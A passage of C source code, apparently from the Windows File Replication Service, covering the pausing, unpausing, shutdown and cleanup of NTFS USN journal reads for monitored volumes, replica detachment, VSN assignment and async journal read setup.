
    WStatus = (pVme->JournalState == JRNL_STATE_PAUSED) ?
               ERROR_SUCCESS : WAIT_FAILED;

RETURN:

    FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
    return WStatus;

}


ULONG
JrnlUnPauseVolume(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN PJBUFFER              Jbuff,
    IN BOOL                  HaveLock
    )
/*++

Routine Description:

    Un-Pause journal read activity on the specified volume.
    This routine starts up journal read activity on a volume that has
    been previously paused.  It kicks off an async read on the volume
    which will complete on the completion port.

    This routine is called both to initially start activity on a Journal and
    to start the next read on a journal.

    If you are initiating the first journal read or restarting the journal
    after a pause you need to set the journal state to JRNL_STATE_STARTING
    before calling this routine. e.g.

        pVme->JournalState = JRNL_STATE_STARTING;

    On the very first call to start the journal the JournalState should
    be JRNL_STATE_INITIALIZING.  This causes an initial set of journal
    data buffers to be allocated.  Otherwise we get a buffer from the
    JournalFreeQueue.

Arguments:

    pVme:  The volume to pause.

    Jbuff:  An optional caller supplied Journal buffer.  If NULL we get
            one off the free list here.

    HaveLock:  TRUE means the caller has acquired the volume monitor lock.
               FALSE means we acquire it and release it here.

Return Value:

    Win32 status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlUnPauseVolume:"

    PLIST_ENTRY Entry;
    ULONG WStatus;
    NTSTATUS Status;
    BOOL  AllocJbuff = (Jbuff == NULL);
    ULONG SaveJournalState = JRNL_STATE_ERROR;
    ULONG i;
    LONG RetryCount;

    DPRINT2(5, "***** UnPause on Volume %ws - Journal State: %s *****\n",
            pVme->FSVolInfo.VolumeLabel, RSS_NAME(pVme->JournalState));


    //
    // Get the buffer first so we don't block waiting for a free buffer
    // holding the VolumeMonitorQueue lock.
    //

    if (AllocJbuff) {

        if (pVme->JournalState == JRNL_STATE_INITIALIZING) {
            //
            // Allocate a journal buffer from memory if this is a fresh start.
            //
            Jbuff = FrsAllocType(JBUFFER_TYPE);
            //DPRINT1(5, "jb: Am %08x (alloc mem)\n", Jbuff);
        } else {
            //
            //  Get a journal buffer from the free list.
            //  We wait here until a buffer is available.
            //
            if (HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }
            Entry = FrsRtlRemoveHeadQueue(&JournalFreeQueue);
            if (HaveLock) { FrsRtlAcquireQueueLock(&VolumeMonitorQueue); }

            if (Entry == NULL) {
                //
                // Check for abort and cancel all I/O.
                //
                DPRINT(0, "ERROR-JournalFreeQueue Abort.\n");
                if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }
                return ERROR_REQUEST_ABORTED;
            }

            Jbuff = CONTAINING_RECORD(Entry, JBUFFER, ListEntry);
            //DPRINT1(5, "jb: ff %08x\n", Jbuff);
        }
    }

    if (!HaveLock) { FrsRtlAcquireQueueLock(&VolumeMonitorQueue); }

    //
    // Check if paused already or stopped.  If so, ignore the request.
    //
    if ((pVme->JournalState != JRNL_STATE_STARTING) &&
         (pVme->JournalState != JRNL_STATE_INITIALIZING) &&
         (pVme->JournalState != JRNL_STATE_ACTIVE)) {
        if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }
        WStatus = ERROR_SUCCESS;
        goto ERROR_RETURN;
    }

    //
    // If there is already an I/O active don't start another.  This can happen
    // when the IOCancel() from a previous Pause request fails to abort the
    // current journal read immediately.  Now the unpause request starts a
    // second I/O on the volume.  In theory this should be benign since the
    // cancel from the first pause will abort the first read request and the
    // 2nd should complete normally.
    //
    // For now just mark the journal as Active again so when the currently
    // outstanding request completes (or aborts) another read request is issued.
    //
    if (pVme->ActiveIoRequests != 0) {
        DPRINT1(3, "UnPause on volume with non-zero ActiveIoRequest Count: %d\n",
               pVme->ActiveIoRequests);
        if (pVme->ReplayUsnValid) {
            DPRINT(3, "Replay USN is valid.  Waiting for ActiveIoRequest to go to zero\n");
            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
            //
            // Unfortunately if this call is from the journal read thread
            // v.s. another thread unpausing the volume the journal read
            // thread won't be able to decrement the ActiveIoRequests.
            //
            Sleep(5000);
            FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

            if (pVme->ActiveIoRequests != 0) {
                DPRINT1(3, "ActiveIoRequest still non-zero: %d.  Skip replay\n",
                        pVme->ActiveIoRequests);
                pVme->ReplayUsnValid = FALSE;
            }
        }

        //
        // The requests have not yet finished. For now just mark the
        // journal as Active again so when the currently outstanding
        // request completes (or aborts) another read request is issued.
        //
        if (pVme->ActiveIoRequests != 0) {
            pVme->IoActive = TRUE;
            SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_ACTIVE);

            if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }

            WStatus = ERROR_SUCCESS;
            goto ERROR_RETURN;
        }

        //
        // FALL THRU means startup a read on the journal.
        //
    }



    //
    // If we are just starting up or restarting from a pause and the
    // Replay USN is valid then start reading from there.
    //
    if ((pVme->JournalState != JRNL_STATE_ACTIVE) && pVme->ReplayUsnValid) {
        DPRINT1(4, "JrnlReadPoint was: %08x %08x\n", PRINTQUAD(pVme->JrnlReadPoint));
        pVme->JrnlReadPoint = pVme->ReplayUsn;
        pVme->ReplayUsnValid = FALSE;
        DPRINT1(4, "Loading JrnlReadPoint from ReplayUsn: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));
    }

    pVme->IoActive = TRUE;
    pVme->StopIo = FALSE;    // VME Overlap struct available.

    SaveJournalState = pVme->JournalState;
    if (pVme->JournalState != JRNL_STATE_ACTIVE) {
        SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_ACTIVE);
    }

    pVme->ActiveIoRequests += 1;
    FRS_ASSERT(pVme->ActiveIoRequests == 1);


    if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }

    //
    // Post a read on this journal handle to get things started.
    // Note ownership of the buffer goes to another thread via the
    // I/O Completion port so we can't change or look at it
    // (without a lock) unless the read failed.  Even if the read
    // completes synchronously the I/O still completes via the port.
    // The same is true of the related VME struct.
    //
    // An NTSTATUS return of STATUS_JOURNAL_ENTRY_DELETED means the requested
    // USN record is no longer in the Journal (i.e. the journal has
    // wrapped). The corresponding win32 error is ERROR_JOURNAL_ENTRY_DELETED.
    //

    RetryCount = 100;

RETRY_READ:
    Status = FrsIssueJournalAsyncRead(Jbuff, pVme);

    if (!NT_SUCCESS(Status)) {

        if (!HaveLock) { FrsRtlAcquireQueueLock(&VolumeMonitorQueue); }
        if (Status == STATUS_JOURNAL_ENTRY_DELETED) {
            DPRINT(0, " +-+-+-+-+-+- JOURNAL WRAPPED +-+-+-+-+-+-+-+-+-+-\n");

            //
            // The journal wrapped.
            //
            SET_JOURNAL_AND_REPLICA_STATE(pVme, REPLICA_STATE_JRNL_WRAP_ERROR);

        } else
        if ((Status == STATUS_JOURNAL_DELETE_IN_PROGRESS) ||
            (Status == STATUS_JOURNAL_NOT_ACTIVE)) {

            DPRINT(0, " +-+-+-+-+-+- ERROR RETURN FROM FrsIssueJournalAsyncRead +-+-+-+-+-+-+-+-+-+-\n");
            DPRINT(0, "Journal is or is being deleted.  FRS requires the NTFS Journal.\n");
            DisplayNTStatus(Status);
            SET_JOURNAL_AND_REPLICA_STATE(pVme, REPLICA_STATE_JRNL_WRAP_ERROR);

        } else
        if (Status == STATUS_DATA_ERROR) {
            //
            // Internal NTFS detected errors:  e.g.
            // - Usn record size is not quad-aligned
            // - Usn record size extends beyond the end of the Usn page
            // - Usn record size isn't large enough to contain the Usn record
            // - Usn record size extends beyond end of usn journal
            //
            DPRINT(0, " +-+-+-+-+-+- ERROR RETURN FROM FrsIssueJournalAsyncRead +-+-+-+-+-+-+-+-+-+-\n");
            DPRINT(0, "Journal internal inconsistency detected by NTFS.\n");
            DisplayNTStatus(Status);
            SET_JOURNAL_AND_REPLICA_STATE(pVme, REPLICA_STATE_JRNL_WRAP_ERROR);

        } else {
        DPRINT(0, " +-+-+-+-+-+- ERROR RETURN FROM FrsIssueJournalAsyncRead +-+-+-+-+-+-+-+-+-+-\n");
            DPRINT_NT(0, "ERROR - FrsIssueJournalAsyncRead : ", Status);
            DPRINT_NT(0, "ERROR - FrsIssueJournalAsyncRead Iosb.Status: ", Jbuff->Iosb.Status);

            if ((Status == STATUS_INVALID_PARAMETER) && (RetryCount-- > 0)) {
                if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }
                Sleep(500);
                goto RETRY_READ;
            }

            SET_JOURNAL_AND_REPLICA_STATE(pVme, REPLICA_STATE_JRNL_WRAP_ERROR);
            // FRS_ASSERT(FALSE);
        }
        //
        // Restore old journal state.
        //
        pVme->JournalState = SaveJournalState;
        pVme->ActiveIoRequests -= 1;
        FRS_ASSERT(pVme->ActiveIoRequests == 0);

        if (!HaveLock) { FrsRtlReleaseQueueLock(&VolumeMonitorQueue); }

        WStatus = FrsSetLastNTError(Status);
        DPRINT_WS(0, "Error from FrsIssueJournalAsyncRead", WStatus);
        //
        // Error starting the read.  Free Jbuff and return the error.
        //

        goto ERROR_RETURN;
    }

    //
    // IO has started.  If this was a fresh start add a few more buffers
    // on the free list so there are enough to work with.
    //
    if (SaveJournalState == JRNL_STATE_INITIALIZING) {
        for (i=0; i<(NumberOfJounalBuffers-1); i++) {
            Jbuff = FrsAllocType(JBUFFER_TYPE);
            //DPRINT1(5, "jb: Am %08x (alloc mem)\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
        }
    }

    return ERROR_SUCCESS;

ERROR_RETURN:

    //
    // If we allocated a journal buffer here then give it back.
    //
    if (AllocJbuff && (Jbuff != NULL)) {
        if (SaveJournalState == JRNL_STATE_INITIALIZING) {
            //DPRINT1(5, "jb: fm %08x (free mem)\n", Jbuff);
            Jbuff = FrsFreeType(Jbuff);
        } else {
            //DPRINT1(5, "jb: tf %08x\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
        }
    }

    return WStatus;

}


ULONG
JrnlSubmitReadThreadRequest(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN ULONG Request,
    IN ULONG NewState
    )
/*++

Routine Description:

    This routine posts a completion status packet on the journal I/O
    completion port.  This is used to either stop journal I/O or just
    pause it while making changes to the filter table.  When the journal
    read thread gets the request it will cancel journal I/O on the volume
    handle (which can only be done from that thread).  If the post is
    successful then the JournalState is updated with NewState.

    We Assume the caller has acquired the VolumeMonitorQueue lock.

Arguments:

    pVme - the volume monitor entry with the state for this volume's journal.

    Request - The request type.  Either FRS_CANCEL_JOURNAL_READ or
              FRS_PAUSE_JOURNAL_READ.

    NewState - The new state for the journal if the submit succeeds.

Return Value:

    A WIN32 status.

--*/
{
#undef DEBSUB
#define DEBSUB "JrnlSubmitReadThreadRequest:"

    ULONG WStatus;
    PCHAR ReqStr;


    if (Request == FRS_CANCEL_JOURNAL_READ) {
        ReqStr = "cancel journal read";

    } else
    if (Request == FRS_PAUSE_JOURNAL_READ) {
        ReqStr = "pause journal read";

    } else {
        DPRINT1(0, "ERROR - Invalid journal request: %08x\n", Request);
        return ERROR_INVALID_PARAMETER;
    }

    if (pVme->StopIo) {
        return ERROR_BUSY;
    }

    if (JournalCompletionPort == NULL) {
        return ERROR_INVALID_HANDLE;
    }

    DPRINT2(5, "Queueing %s IO req on Volume %ws.\n",
            ReqStr, pVme->FSVolInfo.VolumeLabel);

    //
    // Clear the pVme event if the request is to start a stop or pause sequence.
    // Mark the overlapped struct busy,
    // Submit the pause request to the journal read thread.
    //
    if ((NewState == JRNL_STATE_STOPPING) ||
        (NewState == JRNL_STATE_PAUSE1)) {
        ResetEvent(pVme->Event);
    }

    pVme->StopIo = TRUE;

    if (!PostQueuedCompletionStatus(
            JournalCompletionPort,
            Request,
            (ULONG_PTR) pVme,
            &pVme->CancelOverlap)) {

        WStatus = GetLastError();
        DPRINT2_WS(0, "ERROR - Failed on PostQueuedCompletionStatus of %s on %ws :",
            ReqStr, pVme->FSVolInfo.VolumeLabel, WStatus);
        return WStatus;
    }

    //
    // pkt submited.  Update state.
    //
    pVme->JournalState = NewState;

    DPRINT1(5, "Packet submitted.  Jrnl state is %s\n", RSS_NAME(NewState));

    return ERROR_SUCCESS;

}



ULONG
JrnlShutdownSingleReplica(
    IN PREPLICA Replica,
    IN BOOL HaveLock
    )
/*++

Routine Description:

    Detach this replica from its journal. Decrement the ActiveReplicas count
    on the VME. If zero post a completion packet to the JournalCompletionPort
    so the pending journal read request can be canceled by the read thread.
    If no journal thread is active we do it all here.

    If the volume monitor queue is left empty, we close the completion port.

    The caller must have acquired the pVme->ReplicaListHead lock.

Arguments:

    Replica -- Replica set to detach.

    HaveLock -- TRUE if the caller has acquired the VolumeMonitorQueue
                lock else we get it here.

Return Value:

    Win32 status.


--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlShutdownSingleReplica:"

    ULONG         GStatus;
    LIST_ENTRY    DeadList;
    PFRS_QUEUE    FrsTempList;
    ULONG         WStatus = ERROR_SUCCESS;
    PVOLUME_MONITOR_ENTRY pVme = Replica->pVme;


    DPRINT1(4, ":S: <<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    if (!HaveLock) {
        FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
        FrsRtlAcquireQueueLock(&pVme->ReplicaListHead);
    }

    if (pVme->ActiveReplicas == 0) {
        DPRINT1(0, ":S: ActiveReplicas count already zero on %ws\n",
                pVme->FSVolInfo.VolumeLabel);
        WStatus = ERROR_INVALID_HANDLE;
        goto RETURN;
    }

    //
    // It is possible that this replica struct never made it onto the list
    // if it went into the error state during init or startup.
    //
    if (Replica->VolReplicaList.Flink == NULL) {
        DPRINT2(0, ":S: WARN: Replica struct not on pVme ReplicaListHead for on %ws.  Current replica State: %s\n",
                pVme->FSVolInfo.VolumeLabel, RSS_NAME(Replica->ServiceState));
        WStatus = ERROR_INVALID_HANDLE;
        goto RETURN;
    }

    //
    // Remove replica from the VME list.
    //
    FrsRtlRemoveEntryListLock(&pVme->ReplicaListHead, &Replica->VolReplicaList);
    pVme->ActiveReplicas -= 1;
    ReleaseVmeRef(pVme);

    DPRINT3(4, "Removed %ws from VME  %ws.  %d Replicas remain.\n",
            Replica->ReplicaName->Name, pVme->FSVolInfo.VolumeLabel,
            pVme->ActiveReplicas);

    //
    // IF this is the last active Replica on the volume then stop
    // I/O on the journal.
    //
    if (!IsListEmpty(&pVme->ReplicaListHead.ListHead)) {
        WStatus = ERROR_SUCCESS;
        goto RETURN;
    }

    if (pVme->ActiveReplicas != 0) {
        DPRINT2(0, ":S: ERROR - pVme->ReplicaListHead is empty but ActiveReplicas count is non-zero (%d) on %ws\n",
                pVme->ActiveReplicas, pVme->FSVolInfo.VolumeLabel);
        DPRINT(0, ":S: ERROR - Stopping the journal anyway\n");
        pVme->ActiveReplicas = 0;
    }

    //
    // This is the last Replica set on the volume.  Stop the journal.
    //
    if (!HANDLE_IS_VALID(JournalReadThreadHandle)) {

        //
        // There is no Journal thread.  Put the VME on the
        // stop queue and Close the handle here.
        //
        FrsRtlRemoveEntryQueueLock(&VolumeMonitorQueue, &pVme->ListEntry);
        pVme->IoActive = FALSE;
        pVme->WStatus = ERROR_SUCCESS;

        SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_STOPPED);

        DPRINT1(0, ":S: FrsRtlInsertTailQueue -- onto stop queue %08x\n", pVme);
        FrsRtlInsertTailQueue(&VolumeMonitorStopQueue, &pVme->ListEntry);

        FRS_CLOSE(pVme->VolumeHandle);
        ReleaseVmeRef(pVme);

        if ((VolumeMonitorQueue.Count == 0) &&
            (JournalCompletionPort != NULL)) {
            //
            // Close the completion port.
            //
            // FRS_CLOSE(JournalCompletionPort);
        }

    } else {
        //
        // if I/O not already stopping, queue a completion packet
        // to the journal read thread to cancel the I/O.
        // The journal read thread will then put the VME on the
        // VolumeMonitorStopQueue.  If we did it here the VME would
        // go to the Stop queue and the ActiveReplicas count would
        // be decremented before I/O has actually stopped on the journal.
        //
        WStatus = JrnlSubmitReadThreadRequest(pVme,
                                              FRS_CANCEL_JOURNAL_READ,
                                              JRNL_STATE_STOPPING);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT2(0, ":S: ERROR: JrnlSubmitReadThreadRequest to stop Journal Failed on %ws.  Current Journal State: %s\n",
                    pVme->FSVolInfo.VolumeLabel, RSS_NAME(pVme->JournalState));
            DPRINT_WS(0, "ERROR: Status is", WStatus);
        }
    }



    if (DoDebug(5, DEBSUB)) {
// "TEST CODE VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV"
        DPRINT(5, "\n");
        DPRINT1(5, "==== start of volume change order hash table dump for %ws ===========\n",
                pVme->FSVolInfo.VolumeLabel);
        DPRINT(5, "\n");
        GHT_DUMP_TABLE(5, pVme->ChangeOrderTable);
        DPRINT(5, "\n");
        DPRINT(5, "========= End of Change order hash table dump ================\n");
        DPRINT(5, "\n");



        DPRINT(5, "\n");
        DPRINT1(5, "==== start of USN write filter table dump for %ws ===========\n",
                pVme->FSVolInfo.VolumeLabel);
        DPRINT(5, "\n");

        QHashEnumerateTable(pVme->FrsWriteFilter, QHashDump, NULL);
        DPRINT(5, "\n");
        DPRINT(5, "==== End of USN write filter table dump ===========\n");
        DPRINT(5, "\n");


        DPRINT(5, "\n");
        DPRINT1(5, "==== start of recovery conflict table dump for %ws ===========\n",
                pVme->FSVolInfo.VolumeLabel);
        DPRINT(5, "\n");


#ifdef RECOVERY_CONFLICT
        QHashEnumerateTable(pVme->RecoveryConflictTable, QHashDump, NULL);
        DPRINT(5, "\n");
        DPRINT(5, "==== End of recovery conflict table dump ===========\n");
        DPRINT(5, "\n");
#endif  // RECOVERY_CONFLICT
    }

//  "TEST CODE ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"

    GHT_DUMP_TABLE(3, pVme->ActiveInboundChangeOrderTable);

    //
    // Drop the initial allocation ref so the count can drop to zero
    // when the last reference is released.
    //
    ReleaseVmeRef(pVme);

RETURN:
    if (!HaveLock) {
        FrsRtlReleaseQueueLock(&pVme->ReplicaListHead);
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
    }
    return WStatus;
}



VOID
JrnlCleanupVme(
    IN PVOLUME_MONITOR_ENTRY pVme
    )
/*++

Routine Description:

    Free the VME storage when the ref count goes to zero.  Called by the
    ReleaseVmeRef() macro.  Don't free the Vme proper because other threads
    may still try to take out a ref on the Vme and they will test the ref count
    for zero and fail.

Arguments:

    pVme -- Volume Monitor Entry to close.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCleanupVme:"


    USN          PurgeUsn;

    DPRINT1(4, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    if (pVme->ActiveReplicas != 0) {
        DPRINT1(0, "ERROR - ActiveReplicas not yet zero on %ws\n",
                pVme->FSVolInfo.VolumeLabel);
        FRS_ASSERT(!"ActiveReplicas not yet zero on volume");
        return;
    }

#if 0
//  Note: Don't delete the CO process queue here since CO Accept may still be cleaning up
// same with aging cache (ChangeOrderTable) and ActiveInboundChangeOrderTable
    FrsRtlDeleteQueue(&pVme->ChangeOrderList);

    GhtDestroyTable(pVme->ChangeOrderTable);
    pVme->ChangeOrderTable = NULL;

    //
    // Cleanup the Active inbound CO Table.
    //
    GhtDestroyTable(pVme->ActiveInboundChangeOrderTable);
    pVme->ActiveInboundChangeOrderTable = NULL;
#endif

    //
    // Release the Filter Table.
    //
    GhtDestroyTable(pVme->FilterTable);
    pVme->FilterTable = NULL;
    //
    // Release the parent file ID table, the active children table,
    // and the Volume Write Filter.
    //
    pVme->ParentFidTable        = FrsFreeType(pVme->ParentFidTable);
    pVme->FrsWriteFilter        = FrsFreeType(pVme->FrsWriteFilter);
    pVme->ActiveChildren        = FrsFreeType(pVme->ActiveChildren);

#ifdef RECOVERY_CONFLICT
    pVme->RecoveryConflictTable = FrsFreeType(pVme->RecoveryConflictTable);
#endif  // RECOVERY_CONFLICT


    DPRINT(4, "\n");
    DPRINT1(4, "==== start of NameSpaceTable table dump for %ws ===========\n",
            pVme->FSVolInfo.VolumeLabel);
    DPRINT(4, "\n");

    QHashEnumerateTable(pVme->NameSpaceTable, QHashDump, NULL);
    DPRINT(4, "\n");
    DPRINT(4, "==== End of NameSpaceTable table dump ===========\n");
    DPRINT(4, "\n");

    pVme->NameSpaceTable  = FrsFreeType(pVme->NameSpaceTable);

    //
    // Remove all the entries from the RENAME_OLD_NAME table and free the table.
    //
    PurgeUsn = MAXLONGLONG;
    QHashEnumerateTable(pVme->RenOldNameTable,
                        JrnlPurgeOldRenameWorker,
                        &PurgeUsn);

    pVme->RenOldNameTable = FrsFreeType(pVme->RenOldNameTable);

// Note: stick the vme on a storage cleanup list
}


ULONG
JrnlCloseVme(
    IN PVOLUME_MONITOR_ENTRY pVme
    )
/*++

Routine Description:

    Close this Volume Monitor Entry by doing a shutdown on all replicas.

    We assume the caller has taken the monitor queue lock.

Arguments:

    pVme -- Volume Monitor Entry to close.

Return Value:

    Win32 status.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlCloseVme:"

    ULONG WStatus = ERROR_SUCCESS;


    DPRINT1(4, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    if (pVme->ActiveReplicas == 0) {
        DPRINT1(1, "ActiveReplicas count already zero on %ws\n",
                pVme->FSVolInfo.VolumeLabel);
        return ERROR_INVALID_HANDLE;
    }

    //
    // Remove all active replicas from the VME list.
    //
    ForEachListEntry( &pVme->ReplicaListHead, REPLICA, VolReplicaList,
        //
        // The iterator pE is type PREPLICA.
        // Caller must have taken the monitor queue lock to avoid lock order prob.
        //
        WStatus = JrnlShutdownSingleReplica(pE, TRUE);
        DPRINT_WS(0, "Error from JrnlShutdownSingleReplica", WStatus);
    );

    if (pVme->ActiveReplicas != 0) {
        DPRINT2(0, "ActiveReplicas count should be zero on %ws. It is %d\n",
                pVme->FSVolInfo.VolumeLabel, pVme->ActiveReplicas);
        WStatus = ERROR_GEN_FAILURE;
    } else {
        WStatus = ERROR_SUCCESS;
    }

    return WStatus;
}

ULONG
JrnlCloseAll(
    VOID
    )
/*++

Routine Description:

    Close all entries on the VolumeMonitorQueue.

Arguments:

    None.

Return Value:

    None.


--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlCloseAll:"

    ULONG                        WStatus;

    DPRINT1(4, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    if (IsListEmpty(&VolumeMonitorQueue.ListHead)) {
        DPRINT(4, "JrnlCloseAll - VolumeMonitorQueue empty.\n");
    }

    //
    // When all the volumes are stopped journal thread should exit instead
    // of looking for work.
    //
    KillJournalThreads = TRUE;
    ForEachListEntry(&VolumeMonitorQueue, VOLUME_MONITOR_ENTRY, ListEntry,

        WStatus = JrnlCloseVme(pE);

        if (pE->JournalState == JRNL_STATE_STOPPED) {
            continue;
        }

        //
        // Drop the lock and wait for the event.
        //
        if (pE->JournalState == JRNL_STATE_STOPPING) {
            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

            WStatus = WaitForSingleObject(pE->Event, 2000);
            CHECK_WAIT_ERRORS(3, WStatus, 1, ACTION_CONTINUE);

            //
            // Check the result state.
            //
            FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

            if (pE->JournalState == JRNL_STATE_STOPPED) {
                continue;
            }
        }
        DPRINT2(1, "ERROR: Request to stop Journal Failed on %ws.  Current Journal State: %s\n",
                pE->FSVolInfo.VolumeLabel, RSS_NAME(pE->JournalState));
        //
        // Force it onto the stopped queue and set the state to ERROR.
        //
        if (pE->IoActive) {
            SET_JOURNAL_AND_REPLICA_STATE(pE, JRNL_STATE_ERROR);

            VmeDeactivate(&VolumeMonitorQueue, pE, WStatus);
        }
    );

    return ERROR_SUCCESS;
}


ULONG
JrnlClose(
    IN HANDLE VolumeHandle
    )
/*++

Routine Description:

    This routine walks the VolumeMonitorQueue looking for the entry with the
    given VolumeHandle.  It then decrements the reference count and if zero
    we post a completion packet to the JournalCompletionPort so the pending
    journal read request can be canceled.

Arguments:

    VolumeHandle -- The handle of the volume to close.

Return Value:

    None.


--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlClose:"

    ULONG                 WStatus;
    BOOL                  Found;

    DPRINT1(4, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    Found = FALSE;

    ForEachListEntry(&VolumeMonitorQueue, VOLUME_MONITOR_ENTRY, ListEntry,

        if (pE->VolumeHandle == VolumeHandle) {

            //
            // Handle matches.  Close the Volume Monitor Entry.
            //
            Found = TRUE;
            WStatus = JrnlCloseVme(pE);
            if (pE->JournalState == JRNL_STATE_STOPPED) {
                break;
            }

            //
            // Drop the lock and wait for the event.
            //
            if (pE->JournalState == JRNL_STATE_STOPPING) {
                FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

                WStatus = WaitForSingleObject(pE->Event, 2000);
                CHECK_WAIT_ERRORS(3, WStatus, 1, ACTION_CONTINUE);

                //
                // Check the result state.
                //
                FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

                if (pE->JournalState == JRNL_STATE_STOPPED) {
                    break;
                }
            }
            DPRINT2(0, "ERROR: Request to stop Journal Failed on %ws.  Current Journal State: %s\n",
                    pE->FSVolInfo.VolumeLabel, RSS_NAME(pE->JournalState));
            //
            // Force it onto the stopped queue and set the state to ERROR.
            //
            if (pE->IoActive) {
                SET_JOURNAL_AND_REPLICA_STATE(pE, JRNL_STATE_ERROR);
                VmeDeactivate(&VolumeMonitorQueue, pE, WStatus);
            }

            break;
        }
    );

    if (!Found) {
        DPRINT1(0, "ERROR - JrnlClose - Handle %08x not found in VolumeMonitorQueue\n",
                 VolumeHandle);
    }

    return ERROR_SUCCESS;
}




VOID
JrnlNewVsn(
    IN PCHAR                 Debsub,
    IN ULONG                 uLineNo,
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN OUT PULONGLONG        NewVsn
    )
/*++

Routine Description:

    Assign a new VSN for this volume.  Save a recovery point after
    VSN_SAVE_INTERVAL VSNs have been handed out.

Arguments:

    Debsub -- name of Function calling us for trace.
    uLineNo -- Linenumber of caller for trace.
    pVme -- Volume Monitor Entry with the Vsn state.
    NewVsn -- Ptr to return Vsn

Return Value:

    Win32 status.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlNewVsn:"


    ULONGLONG TempVsn;
    BOOL SaveFlag = FALSE;


    LOCK_VME(pVme);

    TempVsn = ++pVme->FrsVsn;
    *NewVsn = TempVsn;

    if ((TempVsn & (ULONGLONG) VSN_SAVE_INTERVAL) == QUADZERO) {
            SaveFlag = TRUE;


            DebPrint(4,
                     (PUCHAR)  "++ VSN Save Triggered: NextVsn: %08x %08x"
                     "  LastUsnSaved: %08x %08x  CurrUsnDone: %08x %08x\n",
                     Debsub,
                     uLineNo,
                     PRINTQUAD(TempVsn),
                     PRINTQUAD(pVme->LastUsnSavePoint),
                     PRINTQUAD(pVme->CurrentUsnRecordDone));

            if (pVme->LastUsnSavePoint < pVme->CurrentUsnRecordDone) {
                pVme->LastUsnSavePoint = pVme->CurrentUsnRecordDone;
            }
    }

    UNLOCK_VME(pVme);

    if (SaveFlag) {
        DbsRequestSaveMark(pVme, FALSE);
    }

// Note: perf: check for change to use ExInterlockedAddLargeStatistic
//       so we can pitch the LOCK_VME.  Note the lock is also used to
//       avoid quadword tearing on LastUsnSavePoint with USN save point
//       test in the journal loop.  Need to fix that too

}



NTSTATUS
FrsIssueJournalAsyncRead(
    IN PJBUFFER Jbuff,
    IN PVOLUME_MONITOR_ENTRY pVme
    )
/*++

Routine Description:

    This routine posts an async read to the journal specified by the handle
    in the Vme using the buffer in Jbuff.

    Note once the async I/O is submitted (and returns STATUS_PENDING)
    the jbuffer and the VME go to another thread via the I/O Completion port
    so neither we nor the caller can change or look at it unless
    the read failed or completed synchronously (unless you have a lock).
    This is because we could block right after the call, the I/O could complete
    and the JournalReadThread could pick up and process the buffer before the
    calling thread ever runs again.

Arguments:

    Jbuff - The Journal Buffer to use for the read request.

    pVme  - The volume monitor entry for the Async Read,

Return Value:

    NTSTATUS status

     The win32 error status is ERROR_NOT_FOUND when the USN is not found in
     the journal.


--*/
{

#undef DEBSUB
#define DEBSUB  "FrsIssueJournalAsyncRead:"

    NTSTATUS Status;
    ULONG WStatus;

    READ_USN_JOURNAL_DATA ReadUsnJournalData;


//  Current journal poll delay in NTFS is 2 seconds  (doesn't apply for async reads)
#define DELAY_TIME ((LONGLONG)(-20000000))
#define FRS_USN_REASON_FILTER  (USN_REASON_CLOSE |             \
                                USN_REASON_FILE_CREATE |       \
                                USN_REASON_RENAME_OLD_NAME)


    //
    // Setup the journal read parameters.  BytesToWaitFor set to sizeof(USN)+1
    // causes the read journal call to return after the first entry is placed
    // in the buffer.  JrnlReadPoint is the point in the journal to start the read.
    // ReturnOnlyOnClose = TRUE means the returned journal entries only
    // include close records (bit <31> of Reason field is set to one).
    // Otherwise you get a record when any reason bit is set, e.g. create,
    // first write, ...
    //

    ReadUsnJournalData.StartUsn = pVme->JrnlReadPoint;     //  USN JrnlReadPoint
    ReadUsnJournalData.ReasonMask = FRS_USN_REASON_FILTER; //  ULONG ReasonMask
    ReadUsnJournalData.ReturnOnlyOnClose = FALSE;          //  ULONG ReturnOnlyOnClose
    ReadUsnJournalData.Timeout = DELAY_TIME;               //  ULONGLONG Timeout
    ReadUsnJournalData.BytesToWaitFor = sizeof(USN)+1;     //  ULONGLONG BytesToWaitFor
